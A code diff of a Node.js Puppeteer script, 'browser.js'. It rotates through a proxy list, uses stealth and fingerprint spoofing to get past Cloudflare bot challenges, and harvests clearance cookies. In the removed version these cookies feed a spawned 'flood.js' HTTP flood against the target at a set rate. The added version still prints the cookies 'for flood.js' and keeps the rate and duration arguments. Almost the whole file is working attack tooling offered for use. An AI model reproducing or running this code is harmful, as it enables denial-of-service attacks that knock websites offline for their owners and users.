@@ -1,338 +1,275 @@
 const fs = require("fs");
-const async = require("async");
-const { exec, spawn } = require("child_process");
+const puppeteer = require("puppeteer-extra");
+const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 
-// Check if we have the right packages
-let puppeteer;
-let StealthPlugin;
+// Add stealth plugin
+puppeteer.use(StealthPlugin());
 
-try {
-  // Try to require puppeteer-extra first
-  puppeteer = require("puppeteer-extra");
-  StealthPlugin = require("puppeteer-extra-plugin-stealth");
-  
-  // Add stealth plugin
-  puppeteer.use(StealthPlugin());
-  
-  console.log("✓ Using puppeteer-extra with stealth plugin");
-} catch (err) {
-  console.error("✗ Failed to load puppeteer-extra:", err.message);
-  process.exit(1);
-}
+// Configuration
+const MAX_RETRIES = 2;
+const TIMEOUT = 30000; // 30 seconds
 
-const COOKIES_MAX_RETRIES = 1;
-
-// Colors & unified logging with [m85|Browser] prefix
-const c = {
+// Colors for logging
+const colors = {
   reset: "\x1b[0m",
-  bright: "\x1b[1m",
   red: "\x1b[31m",
   green: "\x1b[32m",
   yellow: "\x1b[33m",
-  pink: "\x1b[35m",
   cyan: "\x1b[36m",
-  white: "\x1b[37m",
 };
 
-const PREFIX = `${c.bright}${c.cyan}[m85|Browser]${c.reset} `;
-
-const symbols = {
-  info: "ℒ",
-  success: "✓",
-  warn: "!",
-  error: "×",
-  proxy: "ℒ",
-};
-
-function log(type, text) {
-  const symbol = symbols[type] || " ";
-  let color = c.white;
-
-  if (type === "error") color = c.red;
-  if (type === "success") color = c.green;
-  if (type === "warn") color = c.yellow;
-  if (type === "info" || type === "proxy") color = c.cyan;
-  if (type === "pink") color = c.pink;
-
-  console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
+function log(type, message) {
+  const prefix = `${colors.cyan}[Browser]${colors.reset}`;
+  let color = colors.reset;
+  let symbol = "ℹ";
+  
+  if (type === "error") { color = colors.red; symbol = "✗"; }
+  if (type === "success") { color = colors.green; symbol = "✓"; }
+  if (type === "warn") { color = colors.yellow; symbol = "⚠"; }
+  
+  console.log(`${prefix} ${color}${symbol} ${message}${colors.reset}`);
 }
 
-const errorHandler = error => log("error", error.message);
-process.on("uncaughtException", errorHandler);
-process.on("unhandledRejection", errorHandler);
-
-Array.prototype.remove = function (item) {
-  const index = this.indexOf(item);
-  if (index !== -1) {
-    this.splice(index, 1);
-  }
-  return item;
-};
-
-async function spoofFingerprint(page) {
-  await page.evaluateOnNewDocument(() => {
-    Object.defineProperty(window, 'screen', {
-      value: {
-        width: 1920,
-        height: 1080,
-        availWidth: 1920,
-        availHeight: 1080,
-        colorDepth: 64,
-        pixelDepth: 64
-      }
-    });
-    Object.defineProperty(navigator, 'userAgent', {
-      value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
-    });
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl');
-    if (gl) {
-      gl.getParameter = function (parameter) {
-        if (parameter === gl.VENDOR) return 'WebKit';
-        if (parameter === gl.RENDERER) return 'Apple GPU';
-        return gl.getParameter(parameter);
-      };
-    }
-    Object.defineProperty(navigator, 'plugins', {
-      value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
-    });
-    Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
-    Object.defineProperty(navigator, 'webdriver', { get: () => false });
-    Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
-    Object.defineProperty(navigator, 'deviceMemory', { value: 256 });
-    Object.defineProperty(document, 'cookie', {
-      configurable: true,
-      enumerable: true,
-      get: function () { return ''; },
-      set: function () { }
-    });
-    Object.defineProperty(navigator, 'cookiesEnabled', {
-      configurable: true,
-      enumerable: true,
-      get: function () { return true; },
-      set: function () { }
-    });
-    Object.defineProperty(window, 'localStorage', {
-      configurable: true,
-      enumerable: true,
-      value: {
-        getItem: function () { return null; },
-        setItem: function () { },
-        removeItem: function () { }
-      }
-    });
-    Object.defineProperty(navigator, 'doNotTrack', { value: null });
-    Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });
-    Object.defineProperty(navigator, 'language', { value: 'en-US' });
-    Object.defineProperty(navigator, 'vendorSub', { value: '' });
-  });
-}
-
+// Check command line arguments
 if (process.argv.length < 7) {
-  log("error", "Usage: node browser.js <target> <threads> <proxies.txt> <rate> <time>");
+  log("error", "Usage: node browser.js <url> <threads> <proxies.txt> <rate> <duration_seconds>");
+  log("error", "Example: node browser.js https://example.com 5 proxies.txt 100 60");
   process.exit(1);
 }
 
 const targetURL = process.argv[2];
-const threads = parseInt(process.argv[3], 10);
+const threads = parseInt(process.argv[3]);
 const proxyFile = process.argv[4];
-const rates = process.argv[5];
-const duration = parseInt(process.argv[6], 10);
+const duration = parseInt(process.argv[6]);
 
-const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));
-
-const readProxiesFromFile = (filePath) => {
-  try {
-    const data = fs.readFileSync(filePath, 'utf8');
-    const proxies = data.trim().split(/\r?\n/);
-    return proxies;
-  } catch (error) {
-    log("error", `Error reading proxies file: ${error.message}`);
-    return [];
-  }
-};
-
-const proxies = readProxiesFromFile(proxyFile);
-
-const userAgents = () => {
-  const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
-  const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
-  const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
-  const operatingSystems = [
-    "Linux", "Windows", "macOS", "Android", "iOS",
-    "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX",
-    "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS",
-    "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"
-  ];
-  const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
-  const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
-  const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
-  const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
-  const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
-
-  const macbookUA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
-
-  if (Math.random() < 0.3) {
-    return macbookUA;
-  }
-
-  return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
-    `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
-    `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
-    `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
-};
-
-async function detectChallenge(browser, page, browserProxy) {
-  const content = await page.content();
-  if (content.includes("challenge-platform")) {
-    log("pink", `Start Bypass Proxy ℒ ${browserProxy}`);
-    try {
-      await sleep(17);
-      await page.waitForSelector("body > div.main-wrapper > div > div > div > div", { timeout: 10000 });
-      const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
-      if (captchaContainer) {
-        await captchaContainer.click({ offset: { x: 20, y: 20 } });
-      }
-    } catch (error) {
-      log("error", `Error in challenge detection: ${error.message}`);
-    } finally {
-      await sleep(8);
-    }
-  } else {
-    log("warn", `No challenge detected ℒ ${browserProxy}`);
-    await sleep(10);
-  }
+// Read proxies
+let proxies = [];
+try {
+  const data = fs.readFileSync(proxyFile, 'utf8');
+  proxies = data.trim().split(/\r?\n/).filter(p => p.trim());
+  log("success", `Loaded ${proxies.length} proxies`);
+} catch (error) {
+  log("error", `Cannot read proxy file: ${error.message}`);
+  process.exit(1);
 }
 
-async function openBrowser(targetURL, browserProxy) {
-  const userAgent = userAgents();
+if (proxies.length === 0) {
+  log("error", "No proxies found in file");
+  process.exit(1);
+}
+
+// Random user agents
+const userAgents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+];
+
+function getRandomUA() {
+  return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
+// Sleep function
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+// Main browser function
+async function openBrowser(proxy, id) {
+  const userAgent = getRandomUA();
+  const tempDir = `./temp_profile_${id}_${Date.now()}`;
+  
+  // Ensure proxy has http:// prefix
+  let proxyUrl = proxy;
+  if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
+    proxyUrl = `http://${proxyUrl}`;
+  }
   
   const options = {
     headless: "new",
     ignoreHTTPSErrors: true,
+    userDataDir: tempDir,
     args: [
-      `--proxy-server=http://${browserProxy}`,
-      "--no-sandbox",
-      "--no-first-run",
-      "--ignore-certificate-errors",
-      "--disable-extensions",
-      "--test-type",
-      `--user-agent=${userAgent}`,
-      "--disable-gpu",
-      "--disable-browser-side-navigation"
+      `--proxy-server=${proxyUrl}`,
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--disable-dev-shm-usage',
+      '--disable-accelerated-2d-canvas',
+      '--disable-gpu',
+      `--user-agent=${userAgent}`
     ]
   };
   
-  let browser;
+  let browser = null;
+  
   try {
-    log("info", `Launching browser with proxy: ${browserProxy}`);
+    log("info", `[${id}] Launching with proxy: ${proxy}`);
+    
     browser = await puppeteer.launch(options);
-    log("success", `Browser launched successfully`);
+    const page = await browser.newPage();
     
-    const pages = await browser.pages();
-    const page = pages[0];
-    const client = page._client();
+    // Set timeouts
+    page.setDefaultTimeout(TIMEOUT);
+    page.setDefaultNavigationTimeout(TIMEOUT);
     
-    page.on("framenavigated", async (frame) => {
-      if (frame.url() && frame.url().includes("challenges.cloudflare.com") && frame._id) {
-        try {
-          await client.send("Target.detachFromTarget", { targetId: frame._id });
-        } catch (error) {
-          log("error", `Error detaching frame: ${error.message}`);
-        }
-      }
+    // Add random delay to avoid detection
+    await sleep(Math.random() * 2000 + 1000);
+    
+    log("info", `[${id}] Navigating to ${targetURL}`);
+    
+    // Try to navigate
+    await page.goto(targetURL, {
+      waitUntil: 'domcontentloaded',
+      timeout: TIMEOUT
     });
     
-    await spoofFingerprint(page);
-    page.setDefaultNavigationTimeout(60 * 1000);
-    
-    log("info", `Navigating to ${targetURL}`);
-    await page.goto(targetURL, { waitUntil: "domcontentloaded" });
-    
-    await detectChallenge(browser, page, browserProxy);
+    // Get page info
     const title = await page.title();
-    const cookies = await page.cookies(targetURL);
+    const url = page.url();
+    
+    log("success", `[${id}] Loaded: ${title} (${url})`);
+    
+    // Get cookies
+    const cookies = await page.cookies();
+    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+    
+    // Check if blocked
+    if (title.includes("Just a moment") || title.includes("Attention Required")) {
+      log("warn", `[${id}] Cloudflare detected, waiting...`);
+      await sleep(5000);
+    }
+    
+    // Close browser
+    await browser.close();
+    
+    // Cleanup temp directory
+    try {
+      fs.rmSync(tempDir, { recursive: true, force: true });
+    } catch(e) {}
     
     return {
-      browser,
-      title,
-      browserProxy,
-      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
-      userAgent
+      success: true,
+      proxy: proxy,
+      title: title,
+      cookies: cookieString,
+      userAgent: userAgent
     };
+    
   } catch (error) {
-    log("error", `Error in openBrowser: ${error.message}`);
-    if (browser) await browser.close();
-    return null;
+    log("error", `[${id}] Failed: ${error.message}`);
+    
+    if (browser) {
+      try { await browser.close(); } catch(e) {}
+    }
+    
+    // Cleanup temp directory
+    try {
+      fs.rmSync(tempDir, { recursive: true, force: true });
+    } catch(e) {}
+    
+    return {
+      success: false,
+      proxy: proxy,
+      error: error.message
+    };
   }
 }
 
-async function startThread(targetURL, browserProxy, task, done, retries = 0) {
-  if (retries >= COOKIES_MAX_RETRIES) {
-    const currentTask = queue.length();
-    done(null, { task, currentTask });
-    return;
+// Thread worker
+async function worker(proxy, id, retries = 0) {
+  const result = await openBrowser(proxy, id);
+  
+  if (!result.success && retries < MAX_RETRIES) {
+    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES} for ${proxy}`);
+    await sleep(2000);
+    return worker(proxy, id, retries + 1);
   }
-  let browser = null;
-  try {
-    const response = await openBrowser(targetURL, browserProxy);
-    if (!response) {
-      throw new Error("Failed to open browser or retrieve response");
-    }
-    browser = response.browser;
-    if (response.title === "Just a moment..." || response.title === "Attention Required! | Cloudflare") {
-      log("error", `Proxy Issue ℒ ${response.title} - Proxy: ${response.browserProxy}`);
-      if (browser) await browser.close();
-      done(null, { task, currentTask: queue.length() });
-      return;
-    }
-    const cookies = `[ Title ]: ${response.title}\n[ Proxy ]: ${response.browserProxy}\n[ Cookies ]: ${response.cookies}\n`;
-    log("success", cookies);
-    spawn("node", [
-      "flood.js",
-      targetURL,
-      "100",
-      "2",
-      response.browserProxy,
-      rates,
-      response.cookies,
-      response.userAgent
-    ]);
-    if (browser) await browser.close();
-    done(null, { task, currentTask: queue.length() });
-  } catch (error) {
-    log("error", `Error in startThread: ${error.message}`);
-    if (browser) await browser.close();
-    await startThread(targetURL, browserProxy, task, done, retries + 1);
-  }
+  
+  return result;
 }
 
-const queue = async.queue(function (task, done) {
-  startThread(targetURL, task.browserProxy, task, done);
-}, threads);
-
+// Main function
 async function main() {
-  log("info", `Starting with ${threads} threads`);
-  log("info", `Target URL: ${targetURL}`);
+  log("info", `Target: ${targetURL}`);
+  log("info", `Threads: ${threads}`);
   log("info", `Duration: ${duration} seconds`);
-  log("info", `Loaded ${proxies.length} proxies`);
+  log("info", `Total proxies: ${proxies.length}`);
   
-  for (const browserProxy of proxies) {
-    queue.push({ browserProxy });
+  // Create a queue of proxies to test
+  const proxyQueue = [...proxies];
+  let activeThreads = 0;
+  let completed = 0;
+  let successCount = 0;
+  let failCount = 0;
+  
+  // Process function
+  async function processProxy(proxy, id) {
+    activeThreads++;
+    const result = await worker(proxy, id);
+    activeThreads--;
+    completed++;
+    
+    if (result.success) {
+      successCount++;
+      log("success", `[${id}] ✅ SUCCESS - Proxy: ${proxy} | Title: ${result.title}`);
+      // Log cookie for flood.js if needed
+      if (result.cookies) {
+        console.log(`[COOKIES] ${result.cookies}`);
+      }
+    } else {
+      failCount++;
+      log("error", `[${id}] ❌ FAILED - Proxy: ${proxy} | Error: ${result.error}`);
+    }
+    
+    // Log progress
+    if (completed % 10 === 0 || completed === proxyQueue.length) {
+      log("info", `Progress: ${completed}/${proxyQueue.length} | Success: ${successCount} | Failed: ${failCount}`);
+    }
+    
+    // Process next proxy if available
+    if (proxyQueue.length > 0) {
+      const nextProxy = proxyQueue.shift();
+      if (nextProxy) {
+        processProxy(nextProxy, id + threads);
+      }
+    }
   }
   
-  await sleep(duration);
-  queue.kill();
+  // Start initial threads
+  const startTime = Date.now();
+  for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
+    const proxy = proxyQueue.shift();
+    processProxy(proxy, i + 1);
+  }
   
-  exec('pkill -f flood.js', (err) => {
-    if (err) log("error", `Error killing flood.js: ${err.message}`);
-  });
-  exec('pkill chrome', (err) => {
-    if (err) log("error", `Error killing chrome: ${err.message}`);
-  });
+  // Wait for duration or completion
+  const endTime = startTime + (duration * 1000);
   
-  log("success", "Script completed");
-  process.exit();
+  const waitInterval = setInterval(() => {
+    if (Date.now() >= endTime) {
+      log("warn", "Time limit reached, stopping...");
+      clearInterval(waitInterval);
+      process.exit(0);
+    }
+  }, 1000);
+  
+  // Wait for all to complete
+  while (completed < proxies.length && Date.now() < endTime) {
+    await sleep(1000);
+  }
+  
+  clearInterval(waitInterval);
+  
+  log("success", `\n=== FINAL RESULTS ===`);
+  log("success", `Total tested: ${completed}`);
+  log("success", `Successful: ${successCount}`);
+  log("error", `Failed: ${failCount}`);
+  log("success", `Success rate: ${((successCount / completed) * 100).toFixed(2)}%`);
+  
+  process.exit(0);
 }
 
-main();
+// Run main function
+main().catch(error => {
+  log("error", `Fatal error: ${error.message}`);
+  process.exit(1);
+});
